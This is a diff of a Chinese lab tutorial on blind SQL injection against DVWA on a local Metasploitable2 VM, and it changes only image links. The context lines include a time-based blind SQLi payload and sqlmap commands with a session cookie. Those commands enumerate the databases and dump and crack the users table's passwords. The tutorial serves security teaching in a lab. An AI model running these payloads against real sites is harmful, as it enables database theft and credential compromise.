@@ -36,43 +36,43 @@ SQL 盲注在使用上与 SQL 注入没有区别，只是在获取信息的时�
 
 在实验桌面中，双击 Xfce 终端，打开终端：
 
-![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2290timestamp1479374588595.png/wm)
+![此处输入图片的描述](../imgs/wm_181.png)
 
 使用 `sudo virsh start Metasploitable2` 命令即可启动我们的靶机系统虚拟机：
 
-![start-metasploit.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139532596.png/wm)
+![start-metasploit.png](../imgs/wm_182.png)
 
 等待大约四分钟，待得虚拟机完全启动之后我们打开桌面上的 Firefox：
 
-![open-firefox.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139552463.png/wm)
+![open-firefox.png](../imgs/wm_183.png)
 
 访问我们的靶机系统所使用的 IP 地址`192.168.122.102`：
 
-![view-metasploit-url.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139568548.png/wm)
+![view-metasploit-url.png](../imgs/wm_184.png)
 
 正常的启动靶机系统之后，我们访问其 IP 地址可以得到这样的一个页面。
 
 点击 DVMA 我们便可进入到 DVMA 的登陆页面，默认的登陆用户与密码是 admin 与 password，登陆之后便会进入这样的页面：
 
-![dvwa-index.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139587112.png/wm)
+![dvwa-index.png](../imgs/wm_185.png)
 
 为了能够进行最简单的攻击，我们会把安全默认调制最低，首先进入安全模式的调整页面：
 
-![dvwa-config-security.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139662479.png/wm)
+![dvwa-config-security.png](../imgs/wm_186.png)
 
 然后调整安全的 level 到 low：
 
-![dvwa-config-security-1.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139678741.png/wm)
+![dvwa-config-security-1.png](../imgs/wm_187.png)
 
 当看到页面的下方 Level 的显示变化后，说明修改成功了：
 
-![dvwa-config-security-proof.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139693059.png/wm)
+![dvwa-config-security-proof.png](../imgs/wm_188.png)
 
 ### 5.2 SQL 盲注
 
 此时我们把在提供的输入框中输入 `'` 单引号，我们会发现没有任何消息输出，一片空白：
 
-![show-sigle-yinhao](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354035332.png/wm)
+![show-sigle-yinhao](../imgs/wm_189.png)
 
 这就是盲注，没有任何消息返回，不知是对是错，因为本来就有可能返回空值，例如我们输入随机的英文字母 `asd`，即使我们在 SQL Injection 中测试也是一样，因为在数据库中根本就不会查询到英文字母的 ID 值，所以会返回空值。
 
@@ -95,7 +95,7 @@ SQL 盲注在使用上与 SQL 注入没有区别，只是在获取信息的时�
 1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)#
 ```
 
-![show-sleep-1](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354049960.png/wm)
+![show-sleep-1](../imgs/wm_190.png)
 
 此句执行之后，页面加载了有一段时间才出现反应。
 
@@ -116,7 +116,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1’ and if((select cou
 
 而注入语句的内容与上一节的类似，这里不再赘述，毕竟盲注是获取不到错误信息，而不是在接收数据时做了特殊的处理：
 
-![show-source-code](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354065777.png/wm)
+![show-source-code](../imgs/wm_191.png)
 
 ### 5.3 sqlmap 的使用
 
@@ -132,36 +132,36 @@ sqlmap 在使用的时候需要利用的 cookie 的信息，所以我们需要�
 wget http://labfile.oss.aliyuncs.com/courses/717/cockies_manager.xpi	
 ```
 
-![download-xpi](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482230993485.png/wm)
+![download-xpi](../imgs/wm_192.png)
 
 然后我们在 Firefox 中安装该插件：
 
 找到 Firefox 的设置
 
-![install-xpi-1](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231016543.png/wm)
+![install-xpi-1](../imgs/wm_193.png)
 
 然后添加本地的插件安装包：
 
-![install-xpi-2.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231034254.png/wm)
+![install-xpi-2.png](../imgs/wm_194.png)
 找到刚刚我们下载的安装文件：
 
-![install-xpi-3.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231042871.png/wm)
+![install-xpi-3.png](../imgs/wm_195.png)
 
 选择安装该插件：
 
-![install-xpi-4.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231050757.png/wm)
+![install-xpi-4.png](../imgs/wm_196.png)
 
 安装成功之后会提示我们重启浏览器，重启便是。
 
 我们再次登陆到 dvwa 中，并访问 SQL Injection(Blind) 页面，在页面中我们输入 1，我们可以看到查询结果：
 
-![show-sqlmap-1](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354094602.png/wm)
+![show-sqlmap-1](../imgs/wm_197.png)
 
 然后我们可以获得此时的 URL。
 
 接着我们可以通过 cookie_manager 工具获得我们此时的 cookie 值：
 
-![show-cookie](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354106708.png/wm)
+![show-cookie](../imgs/wm_198.png)
 
 紧跟着我们登陆至 kali 的终端中，并输入这样的命令：
 
@@ -173,7 +173,7 @@ sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=S
 
 敲击回车之后，会不断提示询问我们时候继续，当时选择 y，最后我们可以看到一个很有用的消息：
 
-![show-version](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354123062.png/wm)
+![show-version](../imgs/wm_199.png)
 
 我们看到它给我们整个网站搭建所使用的平台以及相应的版本号，我们得到使用的是 MySQL 数据库。
 
@@ -183,7 +183,7 @@ sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=S
 sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=19e123724a6af7960b0838d56a4432bc" --dbs
 ```
 
-![show-dbs](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354133245.png/wm)
+![show-dbs](../imgs/wm_200.png)
 
 查看当前使用的数据库与登陆的用户：
 
@@ -191,7 +191,7 @@ sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=S
 sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=19e123724a6af7960b0838d56a4432bc" -b --current-db --current-user
 ```
 
-![show-current-db](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354156288.png/wm)
+![show-current-db](../imgs/wm_201.png)
 
 我们当前使用的 dvwa，所以我们选择查看 dvwa 数据库中有哪些数据表：
 
@@ -199,7 +199,7 @@ sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=S
 sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=19e123724a6af7960b0838d56a4432bc" -D dvwa --tables
 ```
 
-![show-tables](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354168523.png/wm)
+![show-tables](../imgs/wm_202.png)
 
 得知数据表的名称，当然我们将进一步获取表中表项的内容了：
 
@@ -207,7 +207,7 @@ sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=S
 sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=19e123724a6af7960b0838d56a4432bc" -D dvwa -T users --columns
 ```
 
-![show-columns](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354198634.png/wm)
+![show-columns](../imgs/wm_203.png)
 
 既然都看到表项了，当然要看看具体数据：
 
@@ -217,7 +217,7 @@ sqlmap -u "http://192.168.122.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=S
 
 进过几番的询问，我们都确认，此时 sqlmap 会通过默认放在本地的字典为我们破解数据库中的密码，使其明文显示，因为通过字典匹配所以需要一定的时间：
 
-![show-password](https://doc.shiyanlou.com/document-uid113508labid2424timestamp1482354217960.png/wm)
+![show-password](../imgs/wm_204.png)
 
 可以尝试着使用我们破解出来的用户名与密码登陆一番，看是否能够正常的登陆。
 
